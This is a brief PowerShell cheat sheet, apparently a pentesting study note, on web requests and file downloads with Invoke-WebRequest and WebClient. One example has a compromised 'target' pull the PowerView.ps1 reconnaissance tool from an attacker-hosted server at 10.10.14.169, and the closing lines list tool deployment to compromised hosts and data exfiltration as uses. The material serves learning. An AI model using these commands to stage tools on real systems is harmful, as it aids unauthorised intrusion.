### **PowerShell Web Interaction Overview**

#### **1. Invoke-WebRequest Cmdlet**

- **Purpose**: Facilitates HTTP/HTTPS requests, file downloads, and interaction with web content.
- **Aliases**: `wget`, `iwr`, `curl`.

**Basic GET Request Example**:
```
Invoke-WebRequest -Uri "https://example.com" -Method GET
```

**Inspecting Response Object**:

```
Invoke-WebRequest -Uri "https://example.com" -Method GET | Get-Member
```

**Filtering Content**: To get specific elements, such as images:

```
Invoke-WebRequest -Uri "https://example.com" -Method GET | fl Images
```

**Viewing Raw Content**:

```
Invoke-WebRequest -Uri "https://example.com" -Method GET | fl RawContent
```


#### **2. Downloading Files**
**Direct Download**:
```
Invoke-WebRequest -Uri "https://example.com/file.zip" -OutFile "C:\file.zip"
```
**Example with a Local Web Server**: If you host a file locally:
```
python3 -m http.server 8000
```
From the target:
```
Invoke-WebRequest -Uri "http://10.10.14.169:8000/PowerView.ps1" -OutFile "C:\PowerView.ps1"
```



#### **3. Alternative Methods**
**Using .NET WebClient**: For cases where `Invoke-WebRequest` isn't available:
```
(New-Object Net.WebClient).DownloadFile("https://example.com/file.zip", "C:\file.zip")
```


### **Applications in Administration and Pentesting**
- **Remote Updates and Automation**: Easily script and automate updates or installations on multiple hosts.
- **Pentesting**: Rapidly deploy tools and scripts to compromised hosts, or exfiltrate data.
- **Local vs. External Requests**: Consider the security implications and visibility of your web requests.